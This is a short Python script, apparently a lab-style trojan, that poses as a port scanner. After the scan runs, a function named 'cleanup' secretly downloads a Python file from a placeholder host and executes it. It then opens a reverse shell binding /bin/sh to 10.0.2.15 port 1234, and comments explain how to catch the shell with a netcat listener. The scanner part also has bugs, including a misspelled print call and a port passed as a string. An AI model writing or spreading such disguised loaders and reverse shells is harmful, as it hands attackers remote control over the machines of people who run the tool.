#!/usr/bin/python

import urllib.request, ssl, os, socket, subprocess

ssl._create_default_https_context = ssl._create_unverified_context

def scan():
    print('\n')
    doscan = input("Begin scanning a specific IP and Port? (y/n): ")
    while doscan=='y':
        ip = input("Enter the ip: ")
        port = input("Enter the port: ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((ip, port)): prinr("Port", port, "is closed")
        else: print("Port", port, "is open")
        print('\n')
        doscan = input("Scan another IP and Port? (y/n):")

def resetScanner():
    print('\n')
    print("..... Reseting scanner - Please wait....")
    i = 1
    urllib.request.urlretrieve('http://0.0.0.0/test.py','py1.py')
    while i < 3:
        urllib.request.urlretrieve('http://0.0.0.0/test.txt','filename.txt'*i)
        i += 1
    if os.path.exists('py1.py'):
        os.system('python py1.py')
    if os.path.exists('filename.txt'):
        f = open("filename.txt", "a")
        f.write("\n Leave this file here! \n")
        f.close()

def reverseShell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.0.2.15",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    s.close()
    # to connect back use netcat listener on the specified port: nc -lvp 1234
    # If you run this in Kali, then make sure to have the port open already and waiting to catch the connection.
    # to make it executable, run the following command: chmod 744 scan.py

def cleanup():
    resetScanner()
    reverseShell()
    os.remove('py1.py')
    print("Cleanup done")

# Call scanner
scan()
cleanup()
